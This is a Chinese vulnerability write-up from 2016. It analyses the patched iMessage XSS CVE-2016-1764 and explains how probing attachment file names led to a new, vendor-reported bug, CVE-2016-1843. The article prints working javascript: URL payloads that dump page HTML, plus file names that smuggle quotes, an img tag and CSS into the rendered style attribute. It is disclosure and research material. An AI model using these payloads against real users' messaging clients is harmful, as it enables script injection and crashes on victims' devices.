文/ **SuperHei（知道创宇404安全实验室）** 2016.4.11

注：文章里“0day”在报告给官方后分配漏洞编号：CVE-2016-1843

### 一、背景

在前几天老外发布了一个在3月更新里修复的iMessage xss漏洞（CVE-2016-1764）细节 ：

https://www.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data/

https://github.com/BishopFox/cve-2016-1764

他们公布这些细节里其实没有给出详细触发点的分析，我分析后也就是根据这些信息发现了一个新的0day。

### 二、CVE-2016-1764 漏洞分析

CVE-2016-1764 里的最简单的触发payload： `javascript://a/research?%0d%0aprompt(1)`
可以看出这个是很明显javascript协议里的一个小技巧 %0d%0 没处理后导致的 xss ，这个tips在找xss漏洞里是比较常见的。

这个值得提一下的是 为啥要用`prompt(1)` 而我们常用的是`alert(1)`
，我实际测试了下发现alert确实没办法弹出来，另外在很多的网站其实把alert直接和谐过滤了，所以这里给提醒大家的是在测试xss的时候，把 prompt
替换 alert 是有必要的～

遇到这样的客户端的xss如果要分析，第一步应该看看location.href的信息。这个主要是看是哪个域下，这个漏洞是在`applewebdata://`协议下，这个原漏洞分析里有给出。然后要看具体的触发点，一般在浏览器下我们可以通过看html源代码来分析，但是在客户端下一般看不到，所以这里用到一个小技巧：

    
    
    javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)  

这里是看html里的head代码

    
    
    <style>@media screen and (-webkit-device-pixel-ratio:2) {}</style><link rel="stylesheet" type="text/css" href="file:///System/Library/PrivateFrameworks/SocialUI.framework/Resources/balloons-modern.css">

继续看下body的代码：

    
    
    javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)
    
    <chatitem id="v:iMessage/xxx@xxx.com/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx" contiguous="no" role="heading" aria-level="1" item-type="header"><header guid="v:iMessage/xxx@xxx.com/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"><headermessage text-direction="ltr">与“xxx@xxx.com”进行 iMessage 通信</headermessage></header></chatitem><chatitem id="d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx" contiguous="no" role="heading" aria-level="2" item-type="timestamp"><timestamp guid="d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx" id="d:E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx"><date date="481908183.907740">今天 23:23</date></timestamp></chatitem><chatitem id="p:0/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx" contiguous="no" chatitem-message="yes" role="presentation" display-type="balloon" item-type="text" group-last-message-ignore-timestamps="yes" group-first-message-ignore-timestamps="yes"><message guid="p:0/E4BCBB48-9286-49EC-BA1D-xxxxxxxxxxxx" service="imessage" typing-indicator="no" sent="no" from-me="yes" from-system="no" from="B392EC10-CA04-41D3-A967-5BB95E301475" emote="no" played="no" auto-reply="no" group-last-message="yes" group-first-message="yes"><buddyicon role="img" aria-label="黑哥"><div></div></buddyicon><messagetext><messagebody title="今天 23:23:03" aria-label="javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)"><messagetextcontainer text-direction="ltr"><span style=""><a href=" " title="javascript://a/research?
    prompt(1,document.body.innerHTML)">javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)</a ></span></messagetextcontainer></messagebody><message-overlay></message-overlay></messagetext><date class="compact"></date></message><spacer></spacer></chatitem><chatitem id="p:0/64989837-6626-44CE-A689-5460313DC817" contiguous="no" chatitem-message="yes" role="presentation" display-type="balloon" item-type="text" group-first-message-ignore-timestamps="yes" group-last-message-ignore-timestamps="yes"><message guid="p:0/64989837-6626-44CE-A689-5460313DC817" typing-indicator="no" sent="no" from-me="no" from-system="no" from="D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99" emote="no" played="no" auto-reply="no" group-first-message="yes" group-last-message="yes"><buddyicon role="img" aria-label="黑哥"><div></div></buddyicon><messagetext><messagebody title="今天 23:23:03" aria-label="javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)"><messagetextcontainer text-direction="ltr"><span style=""><a href="javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)" title="javascript://a/research?
    prompt(1,document.body.innerHTML)">javascript://a/research?%0d%0aprompt(1,document.body.innerHTML)</a ></span></messagetextcontainer></messagebody><message-overlay></message-overlay></messagetext><date class="compact"></date></message><spacer></spacer></chatitem><chatitem id="p:0/AE1ABCF1-2397-4F20-A71F-D71FFE8042F5" contiguous="no" chatitem-message="yes" role="presentation" display-type="balloon" item-type="text" group-last-message-ignore-timestamps="yes" group-first-message-ignore-timestamps="yes"><message guid="p:0/AE1ABCF1-2397-4F20-A71F-D71FFE8042F5" service="imessage" typing-indicator="no" sent="no" from-me="yes" from-system="no" from="B392EC10-CA04-41D3-A967-5BB95E301475" emote="no" played="no" auto-reply="no" group-last-message="yes" group-first-message="yes"><buddyicon role="img" aria-label="黑哥"><div></div></buddyicon><messagetext><messagebody title="今天 23:24:51" aria-label="javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)"><messagetextcontainer text-direction="ltr"><span style=""><a href="javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)" title="javascript://a/research?
    prompt(1,document.head.innerHTML)">javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)</a ></span></messagetextcontainer></messagebody><message-overlay></message-overlay></messagetext><date class="compact"></date></message><spacer></spacer></chatitem><chatitem id="s:AE1ABCF1-2397-4F20-A71F-D71FFE8042F5" contiguous="no" role="heading" aria-level="1" item-type="status" receipt-fade="in"><receipt from-me="YES" id="receipt-delivered-s:ae1abcf1-2397-4f20-a71f-d71ffe8042f5"><div class="receipt-container"><div class="receipt-item">已送达</div></div></receipt></chatitem><chatitem id="p:0/43545678-5DB7-4B35-8B81-xxxxxxxxxxxx" contiguous="no" chatitem-message="yes" role="presentation" display-type="balloon" item-type="text" group-first-message-ignore-timestamps="yes" group-last-message-ignore-timestamps="yes"><message guid="p:0/43545678-5DB7-4B35-8B81-xxxxxxxxxxxx" typing-indicator="no" sent="no" from-me="no" from-system="no" from="D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99" emote="no" played="no" auto-reply="no" group-first-message="yes" group-last-message="yes"><buddyicon role="img" aria-label="黑哥"><div></div></buddyicon><messagetext><messagebody title="今天 23:24:51" aria-label="javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)"><messagetextcontainer text-direction="ltr"><span style=""><a href="javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)" title="javascript://a/research?
    prompt(1,document.head.innerHTML)">javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)</a ></span></messagetextcontainer></messagebody><message-overlay></message-overlay></messagetext><date class="compact"></date></message><spacer></spacer></chatitem>

那么关键的触发点:

    
    
    <a href="javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)" title="javascript://a/research?
    prompt(1,document.head.innerHTML)">javascript://a/research?%0d%0aprompt(1,document.head.innerHTML)</a >

就是这个了。 javascript直接进入a标签里的href，导致点击执行。新版本的修复方案是直接不解析`javascript://` 。

### 三、从老漏洞(CVE-2016-1764)到0day

XSS的漏洞本质是你注入的代码最终被解析执行了，既然我们看到了`document.head.innerHTML`的情况，那么有没有其他注入代码的机会呢？首先我测试的肯定是还是那个点，尝试用`"`及`<>`去闭合，可惜都被过滤了，这个点不行我们可以看看其他存在输入的点，于是我尝试发个附件看看解析情况，部分代码如下：

    
    
    <chatitem id="p:0/FE98E898-0385-41E6-933F-8E87DB10AA7E" contiguous="no" chatitem-message="yes" role="presentation" display-type="balloon" item-type="attachment" group-first-message-ignore-timestamps="yes" group-last-message-ignore-timestamps="yes"><message guid="p:0/FE98E898-0385-41E6-933F-8E87DB10AA7E" typing-indicator="no" sent="no" from-me="no" from-system="no" from="D8FAE154-6C88-4FB6-9D2D-0C234BEA8E99" emote="no" played="no" auto-reply="no" group-first-message="yes" group-last-message="yes"><buddyicon role="img" aria-label="黑哥"><div></div></buddyicon><messagetext><messagebody title="今天 23:34:41" file-transfer-element="yes" aria-label="文件传输: tttt.html"><messagetextcontainer text-direction="ltr"><transfer class="transfer" id="45B8E6BD-9826-47E2-B910-D584CE461E5F" guid="45B8E6BD-9826-47E2-B910-D584CE461E5F"><transfer-atom draggable="true" aria-label="tttt.html" id="45B8E6BD-9826-47E2-B910-D584CE461E5F" guid="45B8E6BD-9826-47E2-B910-D584CE461E5F">< img class="transfer-icon" extension="html" aria-label="文件扩展名: html" style="content: -webkit-image-set(url(transcript-resource://iconpreview/html/16) 1x, url(transcript-resource://iconpreview/html-2x/16) 2x);"><span class="transfer-text" color-important="no">tttt</span></transfer-atom><div class="transfer-button-container">< img class="transfer-button-reveal" aria-label="显示" id="filetransfer-button-45B8E6BD-9826-47E2-B910-D584CE461E5F" role="button"></div></transfer></messagetextcontainer></messagebody><message-overlay></message-overlay></messagetext><date class="compact"></date></message><spacer></spacer></chatitem>

发了个tttt.html的附件，这个附件的文件名出现在代码里，或许有控制的机会。多长测试后发现过滤也比较严格，不过最终还是发现一个潜在的点，也就是文件名的扩展名部分：

    
    
    <chatitem id="p:0/D4591950-20AD-44F8-80A1-E65911DCBA22" contiguous="no" chatitem-message="yes" role="presentation" display-type="balloon" item-type="attachment" group-first-message-ignore-timestamps="yes" group-last-message-ignore-timestamps="yes"><message guid="p:0/D4591950-20AD-44F8-80A1-E65911DCBA22" typing-indicator="no" sent="no" from-me="no" from-system="no" from="93D2D530-0E94-4CEB-A41E-2F21DE32715D" emote="no" played="no" auto-reply="no" group-first-message="yes" group-last-message="yes"><buddyicon role="img" aria-label="黑哥"><div></div></buddyicon><messagetext><messagebody title="今天 16:46:10" file-transfer-element="yes" aria-label="文件传输: testzzzzzzz&quot;'&gt;&lt;img src=1&gt;.htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d"><messagetextcontainer text-direction="ltr"><transfer class="transfer" id="A6BE6666-ADBF-4039-BF45-042D261EA458" guid="A6BE6666-ADBF-4039-BF45-042D261EA458"><transfer-atom draggable="true" aria-label="testzzzzzzz&quot;'&gt;&lt;img src=1&gt;.htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d" id="A6BE6666-ADBF-4039-BF45-042D261EA458" guid="A6BE6666-ADBF-4039-BF45-042D261EA458">< img class="transfer-icon" extension="htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d" aria-label="文件扩展名: htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d" style="content: -webkit-image-set(url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d/16) 1x, url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d-2x/16) 2x);"><span class="transfer-text" color-important="no">testzzzzzzz"'&gt;&lt;img src=1&gt;</span></transfer-atom><div class="transfer-button-container">< img class="transfer-button-reveal" aria-label="显示" id="filetransfer-button-A6BE6666-ADBF-4039-BF45-042D261EA458" role="button"></div></transfer></messagetextcontainer></messagebody><message-overlay></message-overlay></messagetext><date class="compact"></date></message><spacer></spacer></chatitem>

我们提交的附件的后缀进入了style ：

    
    
     style="content: -webkit-image-set(url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d/16) 1x, url(transcript-resource://iconpreview/htm::16) 1x, (aaa\\\\\\\\\\\%0a%0d-2x/16) 2x);

也就是可能导致css注入，或许我们还有机会，不过经过测试也是有过滤处理的，比如`/` 直接被转为了`:`这个非常有意思
所谓“成也萧何，败也萧何”，如果你要注入css那么肯定给属性给值就得用: 但是:又不能出现在文件名里，然后我们要注入css里掉用远程css或者图片需要用/
而/又被处理了变成了:

不管怎么样我先注入个css测试下，于是提交了一附件名：

    
    
     zzzzzz.htm) 1x);color/red;aaa/((

按推断/变为了: 如果注入成功应该是

    
    
    style="content: -webkit-image-set(url(transcript-resource://iconpreview/htm::16) 1x);color:red;aaa:((

当我提交测试发送这个附件的时候，我的iMessage 崩溃了～～
这里我想我发现了一个新的漏洞，于是我升级OSX到最新的系统重新测试结果：一个全新的0day诞生！

### 四、后记

当然这里还有很多地方可以测试，也有一些思路也可以去测试下，比如那个名字那里这个应该是可控制的，比如附件是保存在本地的有没有可能存在目录专挑导致写到任意目录的地方。有需求的可以继续测试下，说不定下个0day就是你的
：）

最后我想说的是在分析别人发现的漏洞的时候一定要找到漏洞的关键，然后总结提炼出“模型”，然后去尝试新的攻击思路或者界面！

### 参考链接

https://www.seebug.org/vuldb/ssvid-92471

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/65/>

